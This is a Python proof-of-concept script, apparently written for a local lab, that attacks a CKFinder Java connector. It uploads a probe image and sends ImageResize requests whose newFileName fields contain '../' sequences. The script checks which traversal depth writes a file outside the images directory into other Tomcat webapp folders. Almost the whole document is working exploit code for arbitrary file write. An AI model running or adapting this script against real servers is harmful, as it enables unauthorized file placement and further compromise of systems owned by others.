#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""标定穿越深度：从 Images 根出发，多少层 ../ 能把文件写到指定位置。"""
import os
import re
import urllib.error
import urllib.parse
import urllib.request

TOKEN = "0123456789abcdef0123456789abcdef01234567"
BASE = "http://127.0.0.1:8080"
EP = BASE + "/ckfinder/core/connector/java/connector.java"
IMAGES_ROOT = "/opt/tomcat/webapps/ROOT/Resources/userfiles/images"


def post(fields):
    payload = dict(fields)
    payload.setdefault("CKFinderCommand", "true")
    body = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(EP, data=body, method="POST")
    req.add_header("Cookie", "ckCsrfToken=" + TOKEN)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")


print("\n== 构建：CreateFolder xd ==")
out = post({"command": "CreateFolder", "NewFolderName": "xd",
            "type": "Images", "currentFolder": "/", "ckCsrfToken": TOKEN})
print("  " + (out[:200] if out else "(空)"))

print("\n== 上传源图 ==")
b = "----probe%s" % os.urandom(6).hex()
body = b""
body += ("--%s\r\n" % b).encode()
body += b'Content-Disposition: form-data; name="upload"; filename="src.png"\r\n'
body += b"Content-Type: image/png\r\n\r\n"
body += open("/lab/poc/assets/marker-1x1.png", "rb").read()
body += ("\r\n--%s\r\n" % b).encode()
body += ('Content-Disposition: form-data; name="ckCsrfToken"\r\n\r\n%s\r\n' % TOKEN).encode()
body += ("--%s\r\n" % b).encode()
body += b'Content-Disposition: form-data; name="CKFinderCommand"\r\n\r\ntrue\r\n'
body += ("--%s--\r\n" % b).encode()
req = urllib.request.Request(
    EP + "?command=QuickUpload&type=Images&currentFolder=%2F&responseType=json",
    data=body, method="POST")
req.add_header("Cookie", "ckCsrfToken=" + TOKEN)
req.add_header("Content-Type", "multipart/form-data; boundary=" + b)
with urllib.request.urlopen(req, timeout=20) as r:
    up = r.read().decode("utf-8", "replace")
print("  原始响应: " + up[:400])

src = None
for pat in (r'"name"\s*:\s*"([^"]+)"', r'"fileName"\s*:\s*"([^"]+)"',
            r'name="([^"]+\.(?:png|jpg|gif))"'):
    m = re.search(pat, up)
    if m:
        src = m.group(1)
        break
if not src:
    # 兜底：直接列目录取最新的 png
    cand = [f for f in os.listdir(IMAGES_ROOT) if f.endswith(".png")]
    cand.sort(key=lambda f: os.path.getmtime(os.path.join(IMAGES_ROOT, f)))
    src = cand[-1] if cand else None
print("  使用源图: %s" % src)

print("\n== 依次尝试不同深度，落点统一指向 /upload/login/probe.png ==")
targets = {
    "2 层 (xd/../../upload/...)":   "xd/../../upload/login/probe.png",
    "3 层 (xd/../../../upload/...)": "xd/../../../upload/login/probe.png",
    "4 层 (xd/../../../../upload/...)": "xd/../../../../upload/login/probe.png",
    "3 层指向 shared":              "xd/../../../shared/probe.png",
    "4 层指向 shared":              "xd/../../../../shared/probe.png",
}
for label, tgt in targets.items():
    out = post({"command": "ImageResize", "type": "Images", "currentFolder": "/",
                "fileName": src, "newFileName": tgt, "width": "10", "height": "10",
                "overwrite": "1", "ckCsrfToken": TOKEN})
    m = re.search(r'<Error number="(-?\d+)"[^>]*>([^<]*)<', out)
    code = m.group(1) if m else "?"
    msg = m.group(2) if m and m.group(2) else ""
    print("  %-32s -> Error %s %s" % (label, code, msg))

print("\n== 磁盘落点 ==")
for p in ("/opt/tomcat/webapps/ROOT/upload/login/probe.png",
          "/opt/tomcat/webapps/ROOT/upload/probe.png",
          "/opt/tomcat/webapps/shared/probe.png",
          "/opt/tomcat/webapps/ROOT/Resources/userfiles/upload/login/probe.png",
          "/opt/tomcat/webapps/ROOT/Resources/upload/login/probe.png"):
    print("  %-70s %s" % (p, "存在" if os.path.isfile(p) else "-"))
